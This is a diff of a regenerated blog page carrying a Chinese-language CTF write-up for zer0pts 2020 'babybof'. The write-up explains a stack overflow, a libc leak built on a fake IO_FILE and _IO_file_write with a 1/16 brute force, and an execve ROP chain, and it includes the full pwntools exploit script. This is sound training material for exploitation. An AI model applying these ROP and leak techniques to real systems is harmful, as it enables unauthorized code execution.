@@ -19,12 +19,12 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="代码分析main函数  main函数下就只有一个read函数，且是一个很明显的栈溢出漏洞，但是程序没有其他能够可以泄露出来的函数例如:printf、puts，在遇到这种情况，很有可能是要利用read函数的偏移去得到syscall的gadget，所以我们现在检查一下程序的保护机制 保护机制  很明显我们上面想的操作并不能实现，因为RELRO保护是Full RELRO，我们不能修改got表，所以并不能">
+    <meta name="description" content="代码分析 main函数  main函数下就只有一个read函数，且是一个很明显的栈溢出漏洞，但是程序没有其他能够可以泄露出来的函数例如:printf、puts，在遇到这种情况，很有可能是要利用read函数的偏移去得到syscall的gadget，所以我们现在检查一下程序的保护机制 保护机制  很明显我们上面想的操作并不能实现，因为RELRO保护是Full RELRO，我们不能修改got表，所以并不">
 <meta property="og:type" content="article">
 <meta property="og:title" content="zer0pts_2020_babybof">
 <meta property="og:url" content="https://feng-zz-pwn.github.io/2024/02/26/zer0pts-2020-babybof/index.html">
 <meta property="og:site_name" content="Feng_ZZ">
-<meta property="og:description" content="代码分析main函数  main函数下就只有一个read函数，且是一个很明显的栈溢出漏洞，但是程序没有其他能够可以泄露出来的函数例如:printf、puts，在遇到这种情况，很有可能是要利用read函数的偏移去得到syscall的gadget，所以我们现在检查一下程序的保护机制 保护机制  很明显我们上面想的操作并不能实现，因为RELRO保护是Full RELRO，我们不能修改got表，所以并不能">
+<meta property="og:description" content="代码分析 main函数  main函数下就只有一个read函数，且是一个很明显的栈溢出漏洞，但是程序没有其他能够可以泄露出来的函数例如:printf、puts，在遇到这种情况，很有可能是要利用read函数的偏移去得到syscall的gadget，所以我们现在检查一下程序的保护机制 保护机制  很明显我们上面想的操作并不能实现，因为RELRO保护是Full RELRO，我们不能修改got表，所以并不">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://feng-zz-pwn.github.io/2024/02/26/zer0pts-2020-babybof/111.png">
 <meta property="og:image" content="https://feng-zz-pwn.github.io/2024/02/26/zer0pts-2020-babybof/222.png">
@@ -505,16 +505,18 @@
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
-        <h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h4 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a><code>main</code>函数</h4><img src="/2024/02/26/zer0pts-2020-babybof/111.png" class="" title="label">
-
+        <h2 id="代码分析">代码分析</h2>
+<h4 id="main函数"><code>main</code>函数</h4>
+<img src="/2024/02/26/zer0pts-2020-babybof/111.png" class="" title="label">
 <p><code>main</code>函数下就只有一个<code>read</code>函数，且是一个很明显的栈溢出漏洞，但是程序没有其他能够可以泄露出来的函数例如:<code>printf</code>、<code>puts</code>，在遇到这种情况，很有可能是要利用<code>read</code>函数的偏移去得到<code>syscall</code>的<code>gadget</code>，所以我们现在检查一下程序的保护机制</p>
-<h3 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h3><img src="/2024/02/26/zer0pts-2020-babybof/222.png" class="" title="label">
-
+<h3 id="保护机制">保护机制</h3>
+<img src="/2024/02/26/zer0pts-2020-babybof/222.png" class="" title="label">
 <p>很明显我们上面想的操作并不能实现，因为<code>RELRO</code>保护是<code>Full RELRO</code>，我们不能修改got表，所以并不能修改read的libc地址，所以下面我们最好是看看有没有可以利用的gadget</p>
-<h3 id="搜索gadget"><a href="#搜索gadget" class="headerlink" title="搜索gadget"></a>搜索gadget</h3><img src="/2024/02/26/zer0pts-2020-babybof/333.png" class="" title="label">
-
+<h3 id="搜索gadget">搜索gadget</h3>
+<img src="/2024/02/26/zer0pts-2020-babybof/333.png" class="" title="label">
 <p>这里发现了在<code>0x000000000040043e</code>的<code>gadget</code> ：<code>call qword ptr [rbp + 0x48]</code></p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>可以控制<code>rbp</code>地址为存放我们要执行的地址<code>-0x48</code>的位置就可以指向该地址的指令，所以网上看到的大多数解法都是修改<code>stderr</code>等在<code>bss</code>段上的libc地址，通过爆破<code>1/4096</code>次概率<code>getshell</code>，但是做这题时，我想到<code>pwnable.tw</code>上的一道题**<code>De-ASLR</code>**，通过这题了解到了我们可以利用<code>stderr</code>等<code>IO_File</code>地址实现泄露libc地址，<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2063695">这是学习文章</a></p>
+<h2 id="思路">思路</h2>
+<p>可以控制<code>rbp</code>地址为存放我们要执行的地址<code>-0x48</code>的位置就可以指向该地址的指令，所以网上看到的大多数解法都是修改<code>stderr</code>等在<code>bss</code>段上的libc地址，通过爆破<code>1/4096</code>次概率<code>getshell</code>，但是做这题时，我想到<code>pwnable.tw</code>上的一道题**<code>De-ASLR</code>**，通过这题了解到了我们可以利用<code>stderr</code>等<code>IO_File</code>地址实现泄露libc地址，<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2063695">这是学习文章</a></p>
 <p>所以我随之想到了可以利用这个方法实现，在文章中它使用条件是</p>
 <ul>
 <li>利用<code>gets</code>函数在<code>bss</code>上留下<code>_IO_2_1_stdin</code>地址</li>
@@ -523,8 +525,8 @@
 </ul>
 <p>我们在上面有只有一个不满足即是这个程序编译时没有<code>_libc_csu_init</code>所以我们无法精确定位对应的位置，所以我们这里大概率还是需要去猜地址</p>
 <p>所以我们现在需要看看<code>_IO_2_1_stder</code>等地址与<code>__IO_file_write</code>函数距离是多少，如果只是后2字节不一样，那么我们只用爆破<code>1/16</code>次的概率</p>
-<h4 id="gdb找偏移"><a href="#gdb找偏移" class="headerlink" title="gdb找偏移"></a><code>gdb</code>找偏移</h4><img src="/2024/02/26/zer0pts-2020-babybof/444.png" class="" title="label">
-
+<h4 id="gdb找偏移"><code>gdb</code>找偏移</h4>
+<img src="/2024/02/26/zer0pts-2020-babybof/444.png" class="" title="label">
 <p>可以很明显看到，这个偏移不会超过两个字节，所以我们现在爆破概率就变成了<code>1/16</code>的概率</p>
 <p>所以我们现在就只需要修改<code>stderr</code>的值为存放<code>__IO_file_write</code>函数的地址值，通过<code>leave_ret</code>栈迁移到这个位置上(当然也可以<code>pop rbp</code>)，使得<code>rbp</code>等于存放<code>__IO_file_write</code>函数的地址值</p>
 <p>然后再<code>bss</code>上伪造<code>fake_IO_FILE</code>，实际上就是满足<code>fileno==1</code>和<code>flag2==2</code>其他都可以不用管，然后在我们设置好<code>__IO_file_write</code>函数调用的参数：</p>
@@ -534,13 +536,13 @@
 <li>泄露大小</li>
 </ul>
 <p>然后我们就可以泄露出来libc地址了，再通过我们栈布局提前布置<code>ROP</code>在构造一个<code>read</code>，就可以继续写入<code>ROP chain</code>，然后<code>getshell</code></p>
-<h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><p>我们<code>call qword ptr [rbp + 0x48]</code>的<code>gadget</code>实际上是在<code>setup</code>函数偏移构成，所以我们还需要绕过这段函数：</p>
+<h3 id="坑点">坑点</h3>
+<p>我们<code>call qword ptr [rbp + 0x48]</code>的<code>gadget</code>实际上是在<code>setup</code>函数偏移构成，所以我们还需要绕过这段函数：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, offset stdin@@GLIBC_2_2_5</span><br><span class="line">mov     rdi, [rax]      ; stream</span><br><span class="line">call    _setbuf</span><br><span class="line">mov     rax, offset stdout@@GLIBC_2_2_5</span><br><span class="line">mov     rdi, [rax]      ; stream</span><br><span class="line">call    _setbuf</span><br><span class="line">mov     rax, offset stderr@@GLIBC_2_2_5</span><br><span class="line">mov     rdi, [rax]      ; stream</span><br><span class="line">call    _setbuf</span><br><span class="line">pop     rbp</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
-
 <p>因为此时此刻<code>stderr</code>已经被我们修改为存放<code>__IO_file_write</code>函数的地址值，这段肯定是通过不了，因为要一个IO_FILE结构指针，所以我们可以在<code>call __IO_file_write</code>前把<code>stderr</code>的值恢复回去(因为如果我们预测对了<code>__IO_file_write</code>的值，那么<code>stderr</code>的地址肯定也是那个值)，然后再执行就可以绕过去了</p>
 <p>并且我们不能直接用<code>system(&quot;/bin/sh&quot;)</code>，这里最好是用<code>execve(&quot;/bin/sh&quot;,0,0)</code>系统调用来<code>getshell</code></p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;wt.exe&quot;</span>,<span class="string">&quot;wsl.exe&quot;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_p</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">global</span> p,elf </span><br><span class="line">    p = process(name,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc-2.23.so&quot;</span>&#125;)</span><br><span class="line">    <span class="comment"># p = remote(&quot;node5.buuoj.cn&quot;,29908)</span></span><br><span class="line">    elf = ELF(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x7fadff416758 _IO_file_write</span></span><br><span class="line"><span class="comment"># 0x7fadff418540 stderr</span></span><br><span class="line">pop_rdi = <span class="number">0x000000000040049c</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000040049e</span></span><br><span class="line">pop_rbp = <span class="number">0x000000000040047c</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400499</span></span><br><span class="line">stderr = <span class="number">0x0601040</span></span><br><span class="line">call = <span class="number">0x000000000040043e</span> <span class="comment"># call qword ptr [rbp + 0x48]</span></span><br><span class="line">ret = <span class="number">0x000000000040047d</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"></span><br><span class="line">    get_p(<span class="string">&quot;./zer0pts_2020_babybof&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---------- 修改stderr为存放_IO_file_write函数的地址值 并且在栈上布置ROP chain</span></span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x20</span> + p64(stderr) + p64(pop_rsi) + p64(stderr) + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    payload += p64(pop_rsi) + p64(stderr + <span class="number">0x200</span>) + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    payload += p64(pop_rsi) + p64(stderr+<span class="number">8</span>) + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    payload += p64(pop_rsi) + p64(stderr) + p64(leave_ret) </span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#sleep(2)</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.send(p16(<span class="number">0x6758</span>-<span class="number">0x48</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">	<span class="comment"># ---------- 在bss上伪造fake_IO_FILE</span></span><br><span class="line">    p.send(p64(<span class="number">1</span>)+p64(<span class="number">2</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># ---------- 在bss上步骤ROP chain 并且栈迁移</span></span><br><span class="line">    p.send(p64(ret)*<span class="number">0x20</span> + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>]) +  p64(pop_rsi) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(pop_rdi) + p64(stderr + <span class="number">0x200</span> - (<span class="number">0x8</span>*<span class="number">14</span>)) + p64(call)+ p64(<span class="number">0</span>)+ p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(<span class="number">0x6011a0</span>)+p64(elf.plt[<span class="string">&#x27;read&#x27;</span>]))</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># 还原 stderr的值 泄露libc地址</span></span><br><span class="line">    p.send(p16(<span class="number">0x8540</span>))</span><br><span class="line">    libc.address = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> libc.address == <span class="number">0</span> :</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span> : </span><br><span class="line">        libc.address = <span class="number">0</span></span><br><span class="line">        pwn()</span><br><span class="line">        <span class="comment"># gdb.attach(p)</span></span><br><span class="line">        <span class="comment"># sleep(2)</span></span><br><span class="line">        system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">        pop_rax = <span class="number">0x0000000000033544</span> + libc.address</span><br><span class="line">        pop_rdx = <span class="number">0x0000000000001b92</span> + libc.address</span><br><span class="line">        syscall = <span class="number">0x00000000000026bf</span> + libc.address </span><br><span class="line">        payload = <span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(pop_rax) + p64(<span class="number">0x3b</span>) + p64(pop_rdi) + p64(<span class="number">0x6011a0</span>) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        p.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>
-
+<h2 id="EXP">EXP</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;wt.exe&quot;</span>,<span class="string">&quot;wsl.exe&quot;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_p</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">global</span> p,elf </span><br><span class="line">    p = process(name,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc-2.23.so&quot;</span>&#125;)</span><br><span class="line">    <span class="comment"># p = remote(&quot;node5.buuoj.cn&quot;,29908)</span></span><br><span class="line">    elf = ELF(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x7fadff416758 _IO_file_write</span></span><br><span class="line"><span class="comment"># 0x7fadff418540 stderr</span></span><br><span class="line">pop_rdi = <span class="number">0x000000000040049c</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000040049e</span></span><br><span class="line">pop_rbp = <span class="number">0x000000000040047c</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400499</span></span><br><span class="line">stderr = <span class="number">0x0601040</span></span><br><span class="line">call = <span class="number">0x000000000040043e</span> <span class="comment"># call qword ptr [rbp + 0x48]</span></span><br><span class="line">ret = <span class="number">0x000000000040047d</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"></span><br><span class="line">    get_p(<span class="string">&quot;./zer0pts_2020_babybof&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---------- 修改stderr为存放_IO_file_write函数的地址值 并且在栈上布置ROP chain</span></span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x20</span> + p64(stderr) + p64(pop_rsi) + p64(stderr) + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    payload += p64(pop_rsi) + p64(stderr + <span class="number">0x200</span>) + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    payload += p64(pop_rsi) + p64(stderr+<span class="number">8</span>) + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    payload += p64(pop_rsi) + p64(stderr) + p64(leave_ret) </span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#sleep(2)</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.send(p16(<span class="number">0x6758</span>-<span class="number">0x48</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">	<span class="comment"># ---------- 在bss上伪造fake_IO_FILE</span></span><br><span class="line">    p.send(p64(<span class="number">1</span>)+p64(<span class="number">2</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># ---------- 在bss上步骤ROP chain 并且栈迁移</span></span><br><span class="line">    p.send(p64(ret)*<span class="number">0x20</span> + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>]) +  p64(pop_rsi) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(pop_rdi) + p64(stderr + <span class="number">0x200</span> - (<span class="number">0x8</span>*<span class="number">14</span>)) + p64(call)+ p64(<span class="number">0</span>)+ p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(<span class="number">0x6011a0</span>)+p64(elf.plt[<span class="string">&#x27;read&#x27;</span>]))</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># 还原 stderr的值 泄露libc地址</span></span><br><span class="line">    p.send(p16(<span class="number">0x8540</span>))</span><br><span class="line">    libc.address = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> libc.address == <span class="number">0</span> :</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span> : </span><br><span class="line">        libc.address = <span class="number">0</span></span><br><span class="line">        pwn()</span><br><span class="line">        <span class="comment"># gdb.attach(p)</span></span><br><span class="line">        <span class="comment"># sleep(2)</span></span><br><span class="line">        system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">        pop_rax = <span class="number">0x0000000000033544</span> + libc.address</span><br><span class="line">        pop_rdx = <span class="number">0x0000000000001b92</span> + libc.address</span><br><span class="line">        syscall = <span class="number">0x00000000000026bf</span> + libc.address </span><br><span class="line">        payload = <span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(pop_rax) + p64(<span class="number">0x3b</span>) + p64(pop_rdi) + p64(<span class="number">0x6011a0</span>) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        p.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>
 <img src="/2024/02/26/zer0pts-2020-babybof/555.png" class="" title="label">
     </article>
     <!-- license -->
@@ -723,7 +725,16 @@
         
         
         
+        
+        
+        
+        
+        
     
+        
+        
+        
+        
         
         
         
@@ -736,7 +747,7 @@
     
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 3
+        Total : 4
         </div>
         <!-- search  -->
         
@@ -750,6 +761,12 @@
             <div class="archive-year"> 2024 </div>
             <ul class="year-list">
             
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/16</span>
+            <a class="archive-post-title" href="/2024/03/16/iot-lighttpd/">IOT_Lighttpd</a>
+        </li>
+    
         
         <li class="archive-post-item">
             <span class="archive-post-date">03/12</span>
@@ -774,14 +791,14 @@
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
         
-            <span class="sidebar-tag-name" data-tags="VNCTF">
-                <span class="iconfont-archer">&#xe606;</span>
-                VNCTF
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="IOT">
                 <span class="iconfont-archer">&#xe606;</span>
                 IOT
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="VNCTF">
+                <span class="iconfont-archer">&#xe606;</span>
+                VNCTF
             </span>
         
             <span class="sidebar-tag-name" data-tags="BUUCTF">
@@ -805,14 +822,14 @@
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
-        <span class="sidebar-category-name" data-categories="WP">
-            <span class="iconfont-archer">&#xe60a;</span>
-            WP
-        </span>
-    
         <span class="sidebar-category-name" data-categories="IOT">
             <span class="iconfont-archer">&#xe60a;</span>
             IOT
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="WP">
+            <span class="iconfont-archer">&#xe60a;</span>
+            WP
         </span>
     
         <span class="sidebar-category-name" data-categories="BUUCTF_WP">
